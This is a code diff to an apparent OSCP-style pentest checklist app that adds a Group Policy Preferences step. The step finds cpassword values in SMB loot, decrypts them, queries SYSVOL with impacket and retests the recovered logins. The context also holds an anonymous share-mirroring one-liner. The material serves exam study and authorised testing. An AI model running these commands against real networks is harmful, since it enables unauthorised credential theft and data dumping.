@@ -9,6 +9,7 @@ export const DEFAULT_VARIABLES = {
   dc: "dc01.corp.local",
   user: "student",
   password: "Password123!",
+  gppCpassword: "",
   hash: "NTLM_OR_HASH",
   subnet: "172.16.10.0/24",
   interface: "tun0",
@@ -18,7 +19,7 @@ export const DEFAULT_VARIABLES = {
 export const VARIABLE_GROUPS = [
   { label: "Operator", keys: ["lhost", "lport", "interface"] },
   { label: "Target", keys: ["targetName", "rhost", "rport", "subnet"] },
-  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "password", "hash"] },
+  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "password", "gppCpassword", "hash"] },
   { label: "Resources", keys: ["wordlist"] },
 ];
 
@@ -121,6 +122,18 @@ export const CHECKLIST = [
           { label: "Dump shares (Anonymous)", value: "mkdir -p ~/oscp/{{targetName}}/loot/smb && { smbclient -N -L //{{rhost}} 2>/dev/null || smbclient -U 'guest%' -L //{{rhost}} 2>/dev/null; } | awk '/Disk/ {print $1}' | while read -r s; do [ -z \"$s\" ] && continue; echo \"[*] Checking share: $s\"; mkdir -p ~/oscp/{{targetName}}/loot/smb/\"$s\" && (cd ~/oscp/{{targetName}}/loot/smb/\"$s\" && { smbclient //{{rhost}}/\"$s\" -N -c 'recurse ON; prompt OFF; mget *' >/dev/null 2>&1 || smbclient //{{rhost}}/\"$s\" -U 'guest%' -c 'recurse ON; prompt OFF; mget *' >/dev/null 2>&1; }); done && find ~/oscp/{{targetName}}/loot/smb -mindepth 1 -type d -empty -delete 2>/dev/null && ls -la ~/oscp/{{targetName}}/loot/smb/" },
           { label: "Authenticated SMB", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares --users --groups --sessions" },
           { label: "Download share", value: "smbclient //{{rhost}}/SHARE -U '{{domain}}/{{user}}%{{password}}' -c 'recurse ON; prompt OFF; mget *'" },
+        ],
+      },
+      {
+        id: "svc-smb-gpp",
+        title: "Group Policy Preferences (GPP) credentials",
+        detail: "A cpassword from an XML file is encrypted data, not the login password. Preserve the XML and its userName/runAs field, decrypt the cpassword, then replace the normal user/password variables with the recovered credential before retesting SMB.",
+        commands: [
+          { label: "Find downloaded GPP XML", value: "grep -Rni --include='*.xml' -E 'cpassword|userName|runAs' ~/oscp/{{targetName}}/loot/smb" },
+          { label: "Decrypt one cpassword", value: "gpp-decrypt '{{gppCpassword}}'" },
+          { label: "Parse a saved XML file", value: "impacket-Get-GPPPassword LOCAL -xmlfile /path/to/Groups.xml" },
+          { label: "Search SYSVOL with valid credentials", value: "impacket-Get-GPPPassword '{{domain}}/{{user}}:{{password}}@{{rhost}}' -dc-ip {{rhost}}" },
+          { label: "Retest recovered credential", value: "nxc smb {{rhost}} -d '{{domain}}' -u '{{user}}' -p '{{password}}' --shares --users --groups" },
         ],
       },
       {
